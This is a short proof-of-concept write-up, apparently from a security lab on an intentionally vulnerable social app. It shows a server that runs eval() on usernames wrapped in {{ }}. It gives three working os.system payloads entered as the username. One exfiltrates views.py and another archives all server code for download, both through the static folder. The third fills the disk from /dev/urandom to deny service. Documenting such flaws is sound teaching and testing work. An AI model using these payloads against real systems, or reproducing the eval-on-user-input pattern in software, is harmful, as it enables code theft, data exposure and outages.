# **Proof of Concept**
The vulnerable argument is the **username** entered on registration, where the payload must be inside the `{{ }}` tags. When the `{{ }}` tags are detected, the server will execute the payload inside with `eval()` python function.

To see this vulnerability in action, the attacker can register `{{7*7}}` as the **username** and then to execute the payload, the attacker needs to go to the [/chat](http://social-book-goat-6.deti/chat) page. When searching the user, the server will render the **username** as `49`.


## Example 1: Information Disclosure
Using the following payload as **username** the attacker can get the `views.py` code:
```
{{__import__('os').system('cat back/views.py > static/views.txt')}}
```

When [/chat](http://social-book-goat-6.deti/chat) page is accessed, the server will execute the payload and save the output command in `/static/views.txt` file. The attacker can then access the file by going to [/static/views.txt](http://social-book-goat-6.deti/static/views.txt).


## Example 2: Information Disclosure
Using the following payload as **username** the attacker can get all python code from the server:
```
{{__import__('os').system('tar -czvf static/backup.tar.gz .')}}
```

When [/chat](http://social-book-goat-6.deti/chat) page is accessed, the server will execute the payload and save the output command in `/static/backup.tar.gz` file. The attacker can then access the file by going to [/static/backup.tar.gz](http://social-book-goat-6.deti/static/backup.tar.gz).


## Example 3: Denial of Service
Using the following payload as **username** the attacker can perform a denial of service attack by filling the disk space with random data:
```
{{__import__('os').system('cat /dev/urandom > static/urandom.txt')}}
```

When [/chat](http://social-book-goat-6.deti/chat) page is accessed, the server will execute the payload and save the output command in `/static/urandom.txt` file. The attacker can also access the file by going to [/static/urandom.txt](http://social-book-goat-6.deti/static/urandom.txt).
